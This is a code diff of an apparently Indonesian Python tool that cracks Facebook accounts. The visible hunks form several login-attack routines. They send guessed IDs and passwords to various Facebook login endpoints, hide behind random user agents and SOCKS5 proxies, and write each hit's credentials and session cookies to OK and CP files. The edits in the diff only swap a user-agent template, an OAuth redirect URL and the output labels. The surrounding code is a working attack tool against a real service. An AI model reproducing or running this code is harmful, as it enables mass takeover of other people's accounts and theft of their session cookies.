@@ -81,15 +81,15 @@ for xd in range(10000):
 	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	ugen.append(uaku)
 	
-	a='Mozilla/5.0 (Windows Phone 10.0; Android'
+	a='Mozilla/5.0 (Linux; U; Android'
 	b=random.choice(['4.0','5.0','6.0','7.0','8.0','4.1.1','5.1.1','6.0.1','71.1','7.1.2','8.1.0','8.1.1','9','10','11','12'])
-	c='Microsoft; RM-1152)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	c='ru-ru; MI 2S Build/JRO03L)'
+	d='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Chrome/'
 	e=random.randrange(83,103)
 	f='0'
 	g=random.randrange(4200,4900)
 	h=random.randrange(40,150)
-	i='Mobile Safari/537.36 Edge/15.15254'
+	i='Mobile Safari/534.30'
 	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
 	ugen.append(uaku)
 	
@@ -1411,7 +1411,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CP TAI ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1422,7 +1422,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
+				tree.add(f"[ NAH GITU DONG ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1454,9 +1454,9 @@ def crackmobilev2(idf,pwv):
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in po.cookies.get_dict().keys():
+			if "checkpoint" in po.cookies.get_dict().keys(): 
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CP TAI ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1467,7 +1467,7 @@ def crackmobilev2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
+				tree.add(f"[ NAH GITU DONG ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1501,7 +1501,7 @@ def crackmbasic(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CP TAI ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1512,7 +1512,7 @@ def crackmbasic(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
+				tree.add(f"[ NAH GITU DONG ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1546,7 +1546,7 @@ def crackfree(idf,pwv):
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CP TAI ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1557,7 +1557,7 @@ def crackfree(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
+				tree.add(f"[ NAH GITU DONG ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1583,7 +1583,7 @@ def crackasync(idf,pwv):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
 			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
@@ -1610,7 +1610,7 @@ def crackasync(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CP TAI ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1621,7 +1621,7 @@ def crackasync(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
+				tree.add(f"[ NAH GITU DONG ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1674,7 +1674,7 @@ def crackreguler(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}",width=90,style=f"bold white").add(f"[bold white]{ua}\n",width=90,style=f"bold red")
+				tree.add(f"[ CP TAI ]").add(f"[bold red]{idf}|{pw}",width=90,style=f"bold white").add(f"[bold white]{ua}\n",width=90,style=f"bold red")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1685,7 +1685,7 @@ def crackreguler(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}",width=90,style=f"bold red").add(f"[bold red]{coki}\n",width=90,style=f"bold white").add(f"[bold red]{ua}\n",width=90,style=f"bold white")
+				tree.add(f"[ NAH GITU DONG ]").add(f"[bold white]{idf}|{pw}",width=90,style=f"bold red").add(f"[bold red]{coki}\n",width=90,style=f"bold white").add(f"[bold red]{ua}\n",width=90,style=f"bold white")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				
